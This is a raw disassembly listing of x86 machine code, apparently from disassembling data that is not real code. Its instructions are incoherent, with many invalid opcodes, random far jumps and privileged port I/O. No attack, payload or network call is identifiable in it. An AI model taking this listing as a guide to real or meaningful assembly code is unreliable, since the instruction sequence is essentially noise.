  4190bb:	mov    edi,0x2c002337
  4190c0:	lds    ebx,FWORD PTR [edi+eax*4-0x292afa3c]
  4190c7:	mov    ebp,DWORD PTR [eax]
  4190c9:	xchg   edx,eax
  4190ca:	sbb    al,0x97
  4190cc:	mov    dl,0x5e
  4190ce:	add    ebp,eax
  4190d0:	sub    esp,DWORD PTR [ebx-0x1d]
  4190d3:	xchg   dl,dh
  4190d5:	ret    0xa7c5
  4190d8:	call   0xde3f7748
  4190dd:	sub    edx,DWORD PTR ds:0xd63756be
  4190e3:	jp     0x4190e2
  4190e5:	popa   
  4190e6:	xor    DWORD PTR [edi+esi*2+0x3],0x5e
  4190eb:	aam    0xde
  4190ed:	dec    edx
  4190ee:	icebp  
  4190ef:	into   
  4190f0:	rcr    esp,0x56
  4190f3:	data16 sub bl,BYTE PTR [eax+edx*1-0x5b39ddc0]
  4190fb:	mov    ch,0x17
  4190fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190fe:	jno    0x41911e
  419100:	adc    al,al
  419102:	jl     0x419130
  419104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419105:	test   BYTE PTR [edi+0x2facb55f],0xb2
  41910c:	push   esp
  41910d:	pop    ecx
  41910e:	add    BYTE PTR [edx-0x37e9115a],ah
  419114:	int    0xce
  419116:	add    DWORD PTR [ebx+0x56],esi
  419119:	xchg   edi,eax
  41911a:	pop    eax
  41911b:	ret    
  41911c:	and    ebx,DWORD PTR [ebx+0x4fc64ae1]
  419122:	outs   dx,DWORD PTR ds:[esi]
  419123:	retf   0xa166
  419126:	xor    DWORD PTR [ebx+0x5967f537],eax
  41912c:	inc    ecx
  41912d:	jno    0x4190ca
  41912f:	cmp    al,0xae
  419131:	add    ah,ch
  419133:	into   
  419134:	nop
  419135:	and    eax,0xc17d7810
  41913a:	pop    ebp
  41913b:	sub    DWORD PTR [edx+0x25],edi
  41913e:	sub    edi,0x32
  419141:	xor    bh,BYTE PTR [ecx+0x54]
  419144:	aas    
  419145:	sub    bl,BYTE PTR [edx-0x425e4229]
  41914b:	rcl    BYTE PTR [esi+ebx*1],cl
  41914e:	push   esp
  41914f:	cli    
  419150:	sub    eax,0x302e43a0
  419155:	or     al,0x7b
  419157:	sub    al,0xd1
  419159:	add    eax,ebp
  41915b:	mov    ebp,0x5cd2a6c8
  419160:	xchg   DWORD PTR [ebx],ecx
  419162:	cmp    edi,DWORD PTR [ebx+ebx*1+0x5276e90b]
  419169:	(bad)  
  41916a:	push   esp
  41916b:	int3   
  41916c:	mov    bh,0x3f
  41916e:	aas    
  41916f:	ret    
  419170:	aas    
  419171:	inc    ebp
  419172:	div    al
  419174:	icebp  
  419175:	dec    ebx
  419176:	push   esi
  419177:	mov    ah,0x61
  419179:	sbb    eax,0xe93dcf94
  41917e:	bound  esp,QWORD PTR [ecx]
  419180:	(bad)  
  419181:	cmp    BYTE PTR [ebx],bh
  419183:	inc    ebx
  419184:	js     0x4191de
  419186:	sbb    BYTE PTR [esi],0x51
  419189:	and    BYTE PTR [edx],0xeb
  41918c:	cmp    al,0xb4
  41918e:	mov    dh,dh
  419190:	cmc    
  419191:	ss jno 0x419198
  419194:	xchg   ecx,eax
  419195:	xchg   ecx,eax
  419196:	hlt    
  419197:	call   0xbc808491
  41919c:	mov    ch,0x7
  41919e:	out    dx,eax
  41919f:	and    al,0x8e
  4191a1:	dec    ecx
  4191a2:	dec    edx
  4191a3:	loop   0x4191f1
  4191a5:	jns    0x4191d7
  4191a7:	xor    DWORD PTR [eax-0x76],esi
  4191aa:	sub    BYTE PTR [ebx+eiz*1-0x37233f39],ch
  4191b1:	mov    edx,es
  4191b3:	dec    eax
  4191b4:	retf   
  4191b5:	add    al,0xdb
  4191b7:	mov    esp,0x367800e3
  4191bc:	jmp    0x419192
  4191be:	pop    esi
  4191bf:	mov    ds:0x66c67351,al
  4191c4:	and    eax,0x75b7e853
  4191c9:	jecxz  0x419215
  4191cb:	inc    ecx
  4191cc:	in     eax,0xcb
  4191ce:	jecxz  0x419223
  4191d0:	adc    al,BYTE PTR ds:0x61b7ce71
  4191d6:	fwait
  4191d7:	inc    bx
  4191d9:	sahf   
  4191da:	sbb    dh,BYTE PTR ds:0x2eead669
  4191e0:	mov    edx,0x27956978
  4191e5:	sahf   
  4191e6:	mov    edi,0xbe23887
  4191eb:	and    edi,DWORD PTR [ebp+0x2b]
  4191ee:	fwait
  4191ef:	into   
  4191f0:	dec    ecx
  4191f1:	sbb    bl,bl
  4191f3:	aaa    
  4191f4:	pop    eax
  4191f5:	xor    edi,DWORD PTR [edx+0x46a3a31a]
  4191fb:	cli    
  4191fc:	jne    0x419218
  4191fe:	dec    ebx
  4191ff:	jmp    0x798b1d56
  419204:	scas   al,BYTE PTR es:[edi]
  419205:	shl    DWORD PTR [esi],cl
  419207:	pop    eax
  419208:	cmp    ebp,DWORD PTR [edx]
  41920a:	mov    ah,0x73
  41920c:	jle    0x41927d
  41920e:	mov    al,0xc8
  419210:	xor    al,0x89
  419212:	adc    DWORD PTR [ebx+0x61],esp
  419215:	mov    BYTE PTR [edi],0x1d
  419218:	and    al,0x72
  41921a:	mov    ss,WORD PTR [ebp+0x3d]
  41921d:	and    BYTE PTR [eax-0x1cfa1302],bl
  419223:	mov    esp,0xbb0ee0cb
  419228:	ror    edx,0x68
  41922b:	add    dh,bh
  41922d:	or     al,cl
  41922f:	ins    BYTE PTR es:[edi],dx
  419230:	imul   ah
  419232:	mov    DWORD PTR [ecx+eiz*1+0x7fe098b5],ecx
  419239:	es push ecx
  41923b:	pop    edx
  41923c:	pusha  
  41923d:	cmp    al,0x69
  41923f:	outs   dx,DWORD PTR es:[esi]
  419241:	icebp  
  419242:	(bad)  
  419243:	push   eax
  419244:	pop    ds
  419245:	mov    eax,0xcd7768e6
  41924a:	or     cl,BYTE PTR [esi-0x3ef5e96c]
  419250:	fst    QWORD PTR [edx-0x5eebcff5]
  419256:	(bad)  
  419257:	je     0x4192ab
  419259:	push   ecx
  41925a:	dec    esi
  41925b:	gs push 0xf926cb73
  419261:	and    eax,0x5914541b
  419266:	mov    ebp,0xa5cc3e9f
  41926b:	adc    eax,0xb698a24e
  419270:	call   0xb02a:0x6c483ab
  419277:	gs push cs
  419279:	sbb    al,0xea
  41927b:	and    al,0xcc
  41927d:	bound  edi,QWORD PTR [ebp+0x1d]
  419280:	mov    al,0x87
  419282:	or     eax,0x9bdc70f5
  419287:	pavgw  mm6,mm1
  41928a:	(bad)  
  41928b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41928c:	pop    eax
  41928d:	shr    dl,cl
  41928f:	sbb    al,0xea
  419291:	repz sub al,0xdc
  419294:	dec    ebx
  419295:	outs   dx,DWORD PTR ds:[esi]
  419296:	cmp    eax,0xe752111f
  41929b:	dec    ecx
  41929c:	pop    esi
  41929d:	out    0xa5,al
  41929f:	outs   dx,BYTE PTR ds:[esi]
  4192a0:	aas    
  4192a1:	in     eax,0x45
  4192a3:	jge    0x41926b
  4192a5:	ret    0x9fd1
  4192a8:	push   cs
  4192a9:	xchg   BYTE PTR [esi+0x97935bf],cl
  4192af:	pop    ebp
  4192b0:	ins    DWORD PTR es:[edi],dx
  4192b1:	stos   DWORD PTR es:[edi],eax
  4192b2:	pop    ecx
  4192b3:	push   ss
  4192b4:	and    dl,0x7a
  4192b7:	mov    WORD PTR [ecx-0x18],?
  4192ba:	xrelease xchg BYTE PTR [esi-0x41],al
  4192be:	mov    esi,0x133b64f
  4192c3:	ret    0xf846
  4192c6:	fsub   QWORD PTR [edi+0x11]
  4192c9:	imul   eax,DWORD PTR [eax],0x99f87ca0
  4192cf:	fs repnz into 
  4192d2:	xor    DWORD PTR fs:[ecx+0xa486e75],edi
  4192d9:	aad    0x91
  4192db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192dc:	aam    0xf8
  4192de:	dec    edx
  4192df:	dec    edx
  4192e0:	xor    al,0xb1
  4192e2:	dec    edi
  4192e3:	loopne 0x419284
  4192e5:	jmp    0x419308
  4192e7:	mov    WORD PTR [ebx+0x7e147bd2],ss
  4192ed:	fadd   DWORD PTR [ebx]
  4192ef:	jmp    0xa95a:0x6aa4d9a4
  4192f6:	in     eax,0xf1
  4192f8:	dec    eax
  4192f9:	mov    esp,esp
  4192fb:	enter  0x77ae,0xbd
  4192ff:	pop    ss
  419300:	in     al,0x6a
  419302:	sti    
  419303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419304:	or     eax,0x93fe1a39
  419309:	dec    edx
  41930a:	adc    dh,BYTE PTR [ebx+0x1051e6ed]
  419310:	jg     0x419304
  419312:	cmp    bh,BYTE PTR [eax+0x13]
  419315:	aaa    
  419316:	nop
  419317:	mov    gs,WORD PTR ds:0xe8022e00
  41931d:	add    BYTE PTR [esi],dl
  41931f:	push   ebp
  419320:	fdiv   QWORD PTR [edx+0x702d1a76]
  419326:	int3   
  419327:	aad    0x91
  419329:	inc    edx
  41932a:	stos   DWORD PTR es:[edi],eax
  41932b:	dec    ecx
  41932c:	popf   
  41932d:	mov    dh,0xe9
  41932f:	mov    dl,0xc3
  419331:	xor    bh,BYTE PTR [eax+0xb747456]
  419337:	push   0xcfcd5650
  41933c:	inc    ebp
  41933d:	push   ebp
  41933e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41933f:	outs   dx,BYTE PTR ds:[esi]
  419340:	in     al,0x51
  419342:	pop    ebx
  419343:	fldcw  WORD PTR [edx+0x19]
  419346:	add    edi,DWORD PTR [edi+0x5493d31b]
  41934c:	aaa    
  41934d:	in     al,0x50
  41934f:	into   
  419350:	(bad)  
  419351:	cmp    eax,0xb0bda1a
  419356:	(bad)  
  419357:	fs pop edx
  419359:	cmp    edi,DWORD PTR [esi-0x4f]
  41935c:	mov    ebx,0xf0b58cc5
  419361:	cmp    eax,0x6bde57a2
  419366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419368:	lahf   
  419369:	leave  
  41936a:	iret   
  41936b:	js     0x419380
  41936d:	fild   DWORD PTR [ecx+0x2af59be]
  419373:	cmp    DWORD PTR [edx],ebx
  419375:	pop    esi
  419376:	mov    edx,0xa0d3f855
  41937b:	cs adc eax,0x5366ed80
  419381:	cmp    edi,DWORD PTR [edi+0x4d]
  419384:	mov    al,0x5b
  419386:	mov    WORD PTR [ecx+0x622e0e49],gs
  41938c:	rcl    BYTE PTR [ebx],1
  41938e:	mov    edi,0x6cc0a9fc
  419393:	mov    ebp,0x8c57ab7c
  419398:	in     eax,dx
  419399:	std    
  41939a:	xchg   edi,eax
  41939b:	icebp  
  41939c:	xchg   esi,eax
  41939d:	adc    BYTE PTR [esp+ecx*4-0x1ee48f58],bl
  4193a4:	ja     0x4193ae
  4193a6:	loop   0x4193ee
  4193a8:	in     eax,0xc6
  4193aa:	and    eax,0x9549c8b3
  4193af:	push   ecx
  4193b0:	loopne 0x4193cd
  4193b2:	test   al,0x13
  4193b4:	sbb    BYTE PTR [eax],ah
  4193b6:	push   esi
  4193b7:	dec    ebx
  4193b8:	mov    dl,0x51
  4193ba:	idiv   DWORD PTR [ebp-0x6d]
  4193bd:	xchg   edi,eax
  4193be:	adc    al,0x87
  4193c0:	(bad)  [ebx+0x3b]
  4193c3:	cmc    
  4193c4:	push   cs
  4193c5:	sti    
  4193c6:	mov    ds,eax
  4193c8:	sub    dh,bh
  4193ca:	in     al,dx
  4193cb:	sbb    al,0xe1
  4193cd:	push   0x13f3595c
  4193d2:	std    
  4193d3:	add    ebp,edi
  4193d5:	(bad)  
  4193d6:	popf   
  4193d7:	mov    ebp,0x41a46d2d
  4193dc:	mov    esi,DWORD PTR [esi]
  4193de:	mov    ch,0xa0
  4193e0:	daa    
  4193e1:	jb     0x4193d2
  4193e3:	out    0xf,al
  4193e5:	adc    esp,DWORD PTR [edx+0x51628a3f]
  4193eb:	pushf  
  4193ec:	sbb    ebp,DWORD PTR [edi+0x6c]
  4193ef:	out    0x48,al
  4193f1:	and    esp,esp
  4193f3:	test   al,0x60
  4193f5:	fist   WORD PTR [eax+0x1a722d66]
  4193fb:	mov    edi,0x286a7f2d
  419400:	sbb    dl,BYTE PTR [eax]
  419402:	mov    ah,0x1f
  419404:	scas   al,BYTE PTR es:[edi]
  419405:	mov    ebp,0x24f25f36
  41940a:	imul   ebx,DWORD PTR [edx+eiz*4-0x6b],0xcde8b432
  419412:	stc    
  419413:	mov    al,0xb1
  419415:	mov    al,ds:0x4bb6397f
  41941a:	mov    ebx,0x57ff2e97
  41941f:	iret   
  419420:	in     eax,0x3a
  419422:	xchg   dl,ch
  419424:	inc    esi
  419425:	mov    eax,ds:0x4498540f
  41942a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41942b:	fs xor al,0x3a
  41942e:	sub    cl,ch
  419430:	and    bl,BYTE PTR [eax+0xc]
  419433:	fwait
  419434:	jmp    0x419458
  419436:	jnp    0x419406
  419438:	call   0xa051fbeb
  41943d:	cdq    
  41943e:	add    ch,BYTE PTR [eax]
  419440:	jns    0x4193fc
  419442:	jnp    0x419460
  419444:	rcr    DWORD PTR [esi+ebx*1],cl
  419447:	pusha  
  419448:	data16 jmp 0x4193ff
  41944b:	pusha  
  41944c:	mov    esi,0x5543903b
  419451:	das    
  419452:	dec    ecx
  419453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419454:	(bad)  
  419455:	fild   DWORD PTR [eax]
  419457:	rol    DWORD PTR [edx-0x1e349cf9],0xa9
  41945e:	imul   esi,esp,0x38f5dd68
  419464:	(bad)  
  419465:	sar    al,0x91
  419468:	push   ebx
  419469:	push   ecx
  41946a:	jne    0x4194e2
  41946c:	je     0x419469
  41946e:	scas   eax,DWORD PTR es:[edi]
  41946f:	push   esp
  419470:	and    eax,0xefca6d27
  419475:	xchg   ebp,eax
  419476:	mov    esp,0xb1a87254
  41947b:	mov    al,BYTE PTR [edi+0x2d]
  41947e:	mov    cl,0x9
  419480:	push   edi
  419481:	push   ds
  419482:	in     eax,0xd3
  419484:	imul   ecx,DWORD PTR [edx-0x4a2e69ce],0xffffff9c
  41948b:	cmp    eax,DWORD PTR [edi-0x5c9c6fc8]
  419491:	js     0x4194fb
  419493:	add    eax,0x61107c8
  419498:	ins    DWORD PTR es:[edi],dx
  419499:	mov    ds,WORD PTR [ebp-0x16912cf9]
  41949f:	(bad)  
  4194a0:	ret    0xb816
  4194a3:	cmp    eax,0x8396a49b
  4194a8:	lock int 0x82
  4194ab:	sub    bh,BYTE PTR [edx]
  4194ad:	pop    esi
  4194ae:	mov    dl,0x99
  4194b0:	sub    eax,0xec4b0c69
  4194b5:	push   esp
  4194b6:	fild   WORD PTR [ecx+0x67027f03]
  4194bc:	int    0xf9
  4194be:	dec    eax
  4194bf:	push   edx
  4194c0:	pavgb  mm2,QWORD PTR [esi+0x6e]
  4194c4:	add    al,0x25
  4194c6:	jp     0x4194fc
  4194c8:	sbb    al,0x18
  4194ca:	mov    eax,ds:0xd4862721
  4194cf:	inc    edi
  4194d0:	add    al,0x77
  4194d2:	fidiv  DWORD PTR [si+0xd]
  4194d6:	and    DWORD PTR [ebp+0x4b],edx
  4194d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194da:	das    
  4194db:	and    BYTE PTR [ecx-0x13],dh
  4194de:	mov    WORD PTR [ecx-0xcab92b3],fs
  4194e4:	inc    ebp
  4194e5:	dec    esp
  4194e6:	fiadd  DWORD PTR ds:0xf78b1b9
  4194ec:	pop    ss
  4194ed:	in     eax,0x49
  4194ef:	sbb    BYTE PTR [ebp-0x63],0x28
  4194f3:	jmp    0x6dcb17a3
  4194f8:	xor    al,0x58
  4194fa:	mov    dh,0xda
  4194fc:	std    
  4194fd:	inc    ebx
  4194fe:	fnstenv [edi-0x57]
  419501:	retf   0xbf38
  419504:	sub    al,0x29
  419506:	pop    es
  419507:	inc    ebx
  419508:	push   0xffffffa1
  41950a:	xchg   DWORD PTR [esi],ebp
  41950c:	daa    
  41950d:	or     ch,ah
  41950f:	inc    esi
  419510:	lds    eax,FWORD PTR [edx+ecx*1]
  419513:	xor    edi,DWORD PTR [ecx]
  419515:	add    DWORD PTR [edi],eax
  419517:	or     ebx,ebp
  419519:	add    DWORD PTR [ecx+0x16],eax
  41951c:	addr16 jmp 0x85ddbca8
  419522:	mov    ?,WORD PTR [edi+0x6b]
  419525:	xor    cl,BYTE PTR [ecx]
  419527:	int3   
  419528:	xor    BYTE PTR [eax-0x767b581d],ch
  41952e:	ins    BYTE PTR es:[edi],dx
  41952f:	dec    ebp
  419530:	ret    
  419531:	xor    ch,bl
  419533:	iret   
  419534:	int    0x1a
  419536:	stos   DWORD PTR es:[edi],eax
  419537:	call   0x7650:0xaa985027
  41953e:	and    eax,0xcf1bfb58
  419543:	rcl    al,cl
  419545:	fsub   DWORD PTR [edx+0x2a]
  419548:	xor    BYTE PTR [eax],ch
  41954a:	hlt    
  41954b:	cld    
  41954c:	imul   edi,DWORD PTR [edi+0x59bdf5a5],0xfffffff2
  419553:	lahf   
  419554:	sar    ch,1
  419556:	andnps xmm1,XMMWORD PTR [ecx+0x1d]
  41955a:	fsubp  st(6),st
  41955c:	add    BYTE PTR [ebx+0x5f],cl
  41955f:	sub    eax,0x73e204ec
  419564:	je     0x41953d
  419566:	sub    ah,BYTE PTR [eax]
  419568:	sti    
  419569:	push   ebx
  41956a:	and    esp,DWORD PTR [ebp-0x6c]
  41956d:	ret    0xab8a
  419570:	and    eax,0x33ff9795
  419575:	test   al,0x4f
  419577:	dec    ebx
  419578:	cs repz add eax,0x5d8948db
  41957f:	sbb    al,0xb4
  419581:	cmp    eax,0x537deffe
  419586:	inc    eax
  419587:	(bad)  
  419588:	jbe    0x41958b
  41958a:	call   0x1253d4ba
  41958f:	add    al,bh
  419591:	and    edi,DWORD PTR [ecx]
  419593:	cmp    bh,BYTE PTR [edx-0x6e420a8b]
  419599:	xchg   esp,eax
  41959a:	or     BYTE PTR [ecx+eax*1-0x55],ah
  41959e:	arpl   WORD PTR [ecx-0x22],dx
  4195a1:	outs   dx,BYTE PTR ds:[esi]
  4195a2:	aaa    
  4195a3:	xchg   ebp,eax
  4195a4:	cmp    al,0xf0
  4195a6:	mov    WORD PTR [ebx+0x58ebfe45],ss
  4195ac:	out    0xf1,eax
  4195ae:	adc    al,0x77
  4195b0:	pop    esi
  4195b1:	outs   dx,DWORD PTR ds:[esi]
  4195b2:	test   eax,0xc179cada
  4195b7:	iret   
  4195b8:	js     0x419624
  4195ba:	scas   eax,DWORD PTR es:[edi]
  4195bb:	cmp    eax,0x4deb1a5
  4195c0:	dec    ecx
  4195c1:	xor    al,0x32
  4195c3:	mov    ecx,0xb5d282c5
  4195c8:	outs   dx,BYTE PTR ds:[esi]
  4195c9:	scas   eax,DWORD PTR es:[edi]
  4195ca:	xchg   DWORD PTR [edi+0x5959afd0],edi
  4195d0:	mov    WORD PTR ds:0x6ed8f417,gs
  4195d6:	dec    eax
  4195d7:	pop    esp
  4195d8:	xor    al,0x7a
  4195da:	xchg   ecx,eax
  4195db:	adc    eax,0xe6476763
  4195e0:	pop    esi
  4195e1:	hlt    
  4195e2:	addr16 out 0xdb,al
  4195e5:	fcomp  QWORD PTR [ebx]
  4195e7:	xchg   edi,eax
  4195e8:	loope  0x419644
  4195ea:	jnp    0x4195fc
  4195ec:	push   ebp
  4195ed:	xlat   BYTE PTR ds:[ebx]
  4195ee:	sbb    ebp,esi
  4195f0:	fsubr  DWORD PTR [ebp-0x16]
  4195f3:	and    bh,BYTE PTR ds:0xd97a569c
  4195f9:	bnd jb 0x419622
  4195fc:	ins    BYTE PTR es:[edi],dx
  4195fd:	pop    esp
  4195fe:	xchg   edi,eax
  4195ff:	lods   al,BYTE PTR ds:[esi]
  419600:	loope  0x41960c
  419602:	call   0x249e:0xcbae7765
  419609:	fcomp  QWORD PTR [edx-0x73]
  41960c:	fsub   DWORD PTR [ebp+0x179a85e9]
  419612:	push   0xad2bc77f
  419617:	push   0xffffffe2
  419619:	sub    BYTE PTR [edx-0x5c],ch
  41961c:	lds    esi,FWORD PTR [edi+0x67a666ae]
  419622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419623:	(bad)  
  419624:	mov    sp,0xeb2
  419628:	loop   0x419637
  41962a:	fisub  DWORD PTR [ecx]
  41962c:	(bad)  
  41962d:	mov    edi,0xf190f3cc
  419632:	jno    0x41963f
  419634:	or     BYTE PTR [esi],ah
  419636:	mov    ecx,cs
  419638:	add    al,0x8
  41963a:	or     esi,DWORD PTR [ebx-0x392851f6]
  419640:	pop    DWORD PTR [ebx]
  419642:	loop   0x4196a1
  419644:	add    eax,0x666cb318
  419649:	les    edx,FWORD PTR [edi+0x33]
  41964c:	or     esp,edx
  41964e:	ins    BYTE PTR es:[edi],dx
  41964f:	inc    ecx
  419650:	dec    esi
  419651:	gs in  al,0xd9
  419654:	test   eax,0xe7d48a75
  419659:	cmp    esp,esp
  41965b:	or     edi,DWORD PTR [ebp-0x33]
  41965e:	xchg   ebx,eax
  41965f:	enter  0xa5b8,0xc6
  419663:	push   esp
  419664:	pop    eax
  419665:	(bad)  
  419666:	cmc    
  419667:	stc    
  419668:	in     eax,0xc1
  41966a:	dec    eax
  41966b:	stc    
  41966c:	lods   eax,DWORD PTR ds:[esi]
  41966d:	pop    esi
  41966e:	push   esi
  41966f:	push   ds
  419670:	ror    esp,0xd8
  419673:	inc    edi
  419674:	add    DWORD PTR [edi+0x7d],edx
  419677:	shl    DWORD PTR [ebx-0x6eeb53f3],1
  41967d:	popf   
  41967e:	or     eax,0x78e06055
  419683:	sub    al,ch
  419685:	or     al,0x2b
  419687:	add    DWORD PTR [edi+eax*8+0x17],ebx
  41968b:	mov    al,0xa1
  41968d:	scas   al,BYTE PTR es:[edi]
  41968e:	pushf  
  41968f:	stos   DWORD PTR es:[edi],eax
  419690:	jecxz  0x4196d8
  419692:	dec    ecx
  419693:	sub    BYTE PTR [edi+ecx*8],bh
  419696:	cdq    
  419697:	retf   0x526d
  41969a:	nop
  41969b:	sar    BYTE PTR [ecx],0x31
  41969e:	mov    edx,0x7aa17f01
  4196a3:	jle    0x4196f3
  4196a5:	xchg   BYTE PTR [eax],ah
  4196a7:	mov    eax,0x4fef1145
  4196ac:	and    BYTE PTR fs:0x22a891c7,0xf0
  4196b4:	or     al,0xf3
  4196b6:	gs jne 0x4196a0
  4196b9:	loopne 0x419696
  4196bb:	push   0x2bda08c0
  4196c0:	(bad)  
  4196c1:	xor    eax,0xc797043b
  4196c6:	lea    esi,ss:[edi+0x22ac38f0]
  4196cd:	(bad)  
  4196ce:	fnsave [eax]
  4196d0:	push   esp
  4196d1:	das    
  4196d2:	push   eax
  4196d3:	in     eax,0xa
  4196d5:	pop    ss
  4196d6:	xor    al,bl
  4196d8:	cmp    eax,0xac908dea
  4196dd:	pushw  0xff96
  4196e0:	adc    esi,ebx
  4196e2:	imul   esp,DWORD PTR [ecx],0xc13cf1c1
  4196e8:	fisubr WORD PTR [ebx]
  4196ea:	jbe    0x419746
  4196ec:	xchg   edx,eax
  4196ed:	add    eax,DWORD PTR [edx]
  4196ef:	aam    0x41
  4196f1:	loope  0x419760
  4196f3:	mov    ah,0xdd
  4196f5:	dec    ebp
  4196f6:	or     al,0x1d
  4196f8:	push   ds
  4196f9:	inc    ebp
  4196fa:	out    0x5a,al
  4196fc:	fmul   st,st(3)
  4196fe:	(bad)  
  4196ff:	out    0xbd,eax
  419701:	stc    
  419702:	add    al,0x80
  419704:	push   0xb
  419706:	fsub   st,st(1)
  419708:	rol    DWORD PTR [ebx+edi*1+0x24],0xa7
  41970d:	and    esp,ecx
  41970f:	jmp    0x41971b
  419711:	sbb    eax,0xeab555cc
  419716:	outs   dx,DWORD PTR ds:[esi]
  419717:	xchg   ebx,eax
  419718:	xor    BYTE PTR [edi+0x6f],al
  41971b:	popa   
  41971c:	popf   
  41971d:	dec    esi
  41971e:	pusha  
  41971f:	bswap  edi
  419721:	pop    ds
  419722:	sahf   
  419723:	mov    dl,0xe7
  419725:	rcr    DWORD PTR [ebx],cl
  419727:	mov    ecx,0xfee0a31a
  41972c:	mov    ds:0x686754d5,al
  419731:	jmp    0x419787
  419733:	mov    esp,0x19b59f08
  419738:	loope  0x41971d
  41973a:	add    ebp,edi
  41973c:	in     eax,0xc4
  41973e:	(bad)  
  41973f:	jmp    0xb56d:0xa99086c6
  419746:	inc    esi
  419747:	gs push es
  419749:	xchg   edx,eax
  41974a:	or     BYTE PTR [ebp-0x2b],bh
  41974d:	add    DWORD PTR [ebx+ebp*8-0x2b783d01],ecx
  419754:	xchg   BYTE PTR [esi],ah
  419756:	jecxz  0x4196e3
  419758:	data16 sub ch,ah
  41975b:	retf   0x195d
  41975e:	mov    dh,0x83
  419760:	loop   0x419702
  419762:	cmp    edi,DWORD PTR [eax]
  419764:	mov    ah,0xfd
  419766:	dec    ecx
  419767:	(bad)  
  419768:	xchg   esi,eax
  419769:	stos   DWORD PTR es:[edi],eax
  41976a:	call   0x3ed2f101
  41976f:	jmp    0xb1a3:0x53a74af7
  419776:	out    dx,eax
  419777:	mov    al,0x60
  419779:	(bad)  
  41977a:	fsub   DWORD PTR [esi+0x35]
  41977d:	and    al,0x93
  41977f:	in     al,dx
  419780:	mov    eax,0x8f364ef0
  419785:	cld    
  419786:	and    al,0x3c
  419788:	sub    BYTE PTR [ecx-0x2f],dh
  41978b:	in     eax,dx
  41978c:	mov    ch,0xf4
  41978e:	sbb    BYTE PTR [esi-0x6f],cl
  419791:	adc    BYTE PTR ds:0x66e77a9b,bl
  419797:	jecxz  0x419789
  419799:	jecxz  0x419738
  41979b:	ss int3 
  41979d:	or     eax,0x340c237a
  4197a2:	jmp    0x41973a
  4197a4:	not    DWORD PTR [ebx]
  4197a6:	lahf   
  4197a7:	mov    ebp,0x6fc2a7a3
  4197ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197ad:	pusha  
  4197ae:	jns    0x4197d1
  4197b0:	mov    eax,0x9a3d7fa3
  4197b5:	ja     0x419810
  4197b7:	or     al,0x87
  4197b9:	loopne 0x41982c
  4197bb:	stos   BYTE PTR es:[edi],al
  4197bc:	and    edx,0x1
  4197bf:	aaa    
  4197c0:	adc    esp,esp
  4197c2:	test   DWORD PTR [edx+esi*1-0x72],eax
  4197c6:	repz (bad) 
  4197c9:	or     ecx,DWORD PTR [edi-0x50aad0e1]
  4197cf:	or     al,0x11
  4197d1:	ins    DWORD PTR es:[edi],dx
  4197d2:	mov    ebp,0x5d0ea62
  4197d7:	fwait
  4197d8:	ins    BYTE PTR es:[edi],dx
  4197d9:	jg     0x419817
  4197db:	or     cl,BYTE PTR ds:0x66ec3e66
  4197e1:	xlat   BYTE PTR ds:[ebx]
  4197e2:	xchg   edi,eax
  4197e3:	(bad)  
  4197e5:	jge    0x4197c9
  4197e7:	stos   BYTE PTR es:[edi],al
  4197e8:	or     BYTE PTR ds:0x78ffd936,bl
  4197ee:	sub    eax,0x81bb1420
  4197f3:	enter  0x8361,0x1c
  4197f7:	(bad)  
  4197f8:	sti    
  4197f9:	in     al,0xe1
  4197fb:	sub    eax,0xb9c04172
  419800:	lods   al,BYTE PTR ds:[esi]
  419801:	add    edi,ebx
  419803:	sbb    BYTE PTR [ebx-0x36],ch
  419806:	rol    BYTE PTR ds:0xbdab3188,1
  41980c:	arpl   bx,si
  41980e:	or     edi,ebp
  419810:	icebp  
  419811:	xor    BYTE PTR [ebx+0x62],al
  419814:	pop    ds
  419815:	inc    esp
  419816:	cmp    BYTE PTR [ebp+0x2c1d906d],dh
  41981c:	cdq    
  41981d:	test   eax,0x9ed70b6e
  419822:	add    eax,0xdb021f47
  419827:	repz out dx,al
  419829:	adc    eax,0xd62e2fc4
  41982e:	xor    al,BYTE PTR [esi]
  419830:	ins    DWORD PTR es:[edi],dx
  419831:	(bad)
  419835:	inc    edx
  419836:	adc    BYTE PTR [eax-0x22b6a907],0x3
  41983d:	les    ebx,FWORD PTR [ebx-0x45f6a10f]
  419843:	fiadd  DWORD PTR ds:0xefd6a7b6
  419849:	cmp    BYTE PTR [eax+0x67],0xf5
  41984d:	jmp    DWORD PTR [esi]
  41984f:	sahf   
  419850:	out    0x91,al
  419852:	xchg   esi,eax
  419853:	jbe    0x419858
  419855:	mov    al,ds:0x989f1e3b
  41985a:	pop    ebp
  41985b:	adc    al,0x87
  41985d:	mov    ds:0xc4dad558,al
  419862:	sub    ebx,edi
  419864:	pop    edx
  419865:	jmp    0xbd1:0x19aa1387
  41986c:	or     DWORD PTR [ebx+0x4999ec67],eax
  419872:	and    ebp,DWORD PTR [ebx]
  419874:	das    
  419875:	sbb    edi,DWORD PTR [ebx+0x40]
  419878:	inc    eax
  419879:	repz dec edi
  41987b:	dec    ebx
  41987c:	mov    ebp,0x86fe18c9
  419881:	or     bh,BYTE PTR [eax]
  419883:	sbb    ch,BYTE PTR [ebp+0x5c]
  419886:	std    
  419887:	inc    ebx
  419888:	push   es
  419889:	js     0x419882
  41988b:	loop   0x41983a
  41988d:	push   ds
  41988e:	loope  0x419836
  419890:	lods   al,BYTE PTR ds:[esi]
  419891:	arpl   bx,cx
  419893:	jmp    0x4198a4
  419895:	ret    
  419896:	dec    ebx
  419897:	and    ebp,eax
  419899:	and    al,0x36
  41989b:	call   0x1ad8b6f7
  4198a0:	adc    eax,0xfab11ed8
  4198a5:	mov    esi,0x49575e6e
  4198aa:	push   ecx
  4198ab:	jnp    0x41989c
  4198ad:	push   ds
  4198ae:	les    ecx,FWORD PTR [ebx+esi*1+0x39]
